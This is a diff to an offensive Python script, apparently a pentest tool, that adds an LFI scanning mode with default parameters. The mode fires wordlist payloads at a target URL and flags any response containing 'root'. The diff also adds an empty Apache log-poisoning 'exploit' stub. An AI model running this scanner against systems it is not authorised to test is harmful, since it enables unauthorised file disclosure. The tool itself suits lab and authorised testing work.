@@ -33,6 +33,18 @@ print(leafy_banner)
 
 count = 0
 
+# Arg checker
+def check_arg(arg):
+    try:
+        arg
+    except:
+        print('Missing needed argument')
+        exit
+
+# Exploit Function for apache log poisoning
+def exploit_apache(url):
+    print('yes')
+
 # Dir busting function
 def getRespCode(url):
     try:
@@ -61,74 +73,68 @@ args = parser.parse_args()
 
 # -----------------------------------------------------------------------------------------------------------
 
-# LFI MODE
-if args.mode == "lfi":
-    
-    # Test for all required arguments
-    # Test for IP
+# Exploit Mode
+if args.mode == "exploit":
+    check_arg(args.ip)
     try:
         args.ip
     except:
-        print('You need to indicate an IP to target')
-        exit
-    
-    # Test for port
-    try:
-        args.port
-    except:
-        print("you need to indicate a port to target")
+        print('L')
         exit
 
-    # Test for path
-    try:
-        args.path
-    except:
-        print("you need to indicate a path to target")
-        exit
+# LFI MODE
+if args.mode == "lfi":
+    if args.ip is not None and args.list is not None:
 
-    # Test for param
-    try:
-        args.param
-    except:
-        print("you need to indicate a parameter to target")
-        exit
-    
-    # Test for param
-    try:
-        args.param2
-    except:
-        print("you need to indicate a parameter to target")
-        exit
-    
-    # Test for list
-    try:
-        args.list
-    except:
-        print("you need to indicate a list")
-        exit
-
-    # Define the website
-    website = "http://" + args.ip + ":" + args.port + "/" + args.path + args.param
-
-    # Open list and read all the lines
-    file = open(args.list, 'r')
-    lines = file.readlines()
-    with open(args.list, 'r') as fp:
-        length = len(fp.readlines())
-
-    # Banner
-    print(leafy_banner)
-
-    # Read and loop through every line in file
-    for line in lines:
-        payload = website + line + args.param2
-        payload = payload.replace("\n", "")
-        resp = urllib.request.urlopen(payload)
-        if b'root' in resp.read():
-            print(payload)
-            count += 1
+        # If port is not given, default to 80
+        if args.port is not None:
+            port = args.port
         else:
-            continue
+            port = "80"
+
+        # If path is not given, default to none
+        if args.path is not None:
+            path = args.path
+        else:
+            path = ""
+        
+        # If parameter is not given, default to ?file=
+        if args.param is not None:
+            param = args.param
+        else:
+            param = "?file="
+
+        # If second parameter is not given, default to none
+        if args.param2 is not None:
+            param2 = args.param2
+        else:
+            param2 = ""
+
+        # Define the website
+        website = "http://" + args.ip + ":" + port + "/" + path + param
+
+        # Open list and read all the lines
+        file = open(args.list, 'r')
+        lines = file.readlines()
+        with open(args.list, 'r') as fp:
+            length = len(fp.readlines())
+
+        # Banner
+        print(leafy_banner)
+
+        # Read and loop through every line in file
+        for line in lines:
+            payload = website + line + param2
+            payload = payload.replace("\n", "")
+            resp = urllib.request.urlopen(payload)
+            if b'root' in resp.read():
+                print(payload)
+                count += 1
+            else:
+                continue
+    else:
+        print("You need to specify which IP to target and a wordlist")
+        exit
 
 # -----------------------------------------------------------------------------------------------------------
 
